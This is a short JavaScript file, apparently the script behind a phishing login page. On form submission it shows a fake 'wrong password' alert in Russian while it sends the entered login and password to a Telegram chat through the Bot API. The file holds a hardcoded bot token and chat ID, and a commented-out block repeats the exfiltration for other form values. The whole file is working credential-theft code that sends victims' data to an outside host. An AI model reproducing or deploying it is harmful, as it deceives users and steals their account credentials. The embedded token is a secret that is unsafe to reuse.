const TOKEN = "5922354909:AAHaaLC0GSejijtW7fX9CE8NqIsMcdr9HE0"
const CHAT_ID = "-1001826065457"
const UPI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage `
const success =  document.getElementById("success")


document.getElementById("tg").addEventListener("submit", function (e) {
    e.preventDefault()
    confirm("Неправилный пароль!")
    console.log(this.radio.value)
    let message = `Заявка на сайт\n`;
    message += `login:  ${this.name.value}\n`;
    message += `password: ${this.tel.value}`;

    axios.post(UPI_API, {
        chat_id: CHAT_ID,
        parse_mode: 'html',
        text: message
    })
        .then((res) => {
            this.name.value = "";
            this.tel.value = "";
            // success.innerHTML = "отправельно!";
            success.style.display = "block";
        })
        .catch((err) => {
            console.warn(err)
        })
        .finally(() => {
            console.log("Успешно")
        })
})



// document.getElementById("tg").addEventListener("submit", function (e) {
//     e.preventDefault()
//     const checkBoxes = document.querySelectorAll("input[name=radio]:checked")
//
//     let values = []
//
//     checkBoxes.forEach(checkbox => {
//         values.push(checkbox.value)
//     })
//
//
//     let message  = ""
//
//     for(let i = 0; i < values.length; i++){
//         message += `${i+1} ${values[i]} \n`
//     }
//     axios.post(UPI_API, {
//         chat_id: CHAT_ID,
//         perse_mode: 'html',
//         text: message,
//         text2: name
//     })
//         .then((res) => {
//
//         })
//         .catch((err) => {
//             console.warn(err)
//         })
//         .finally(() => {
//             console.log("Успешно")
//         })
// })
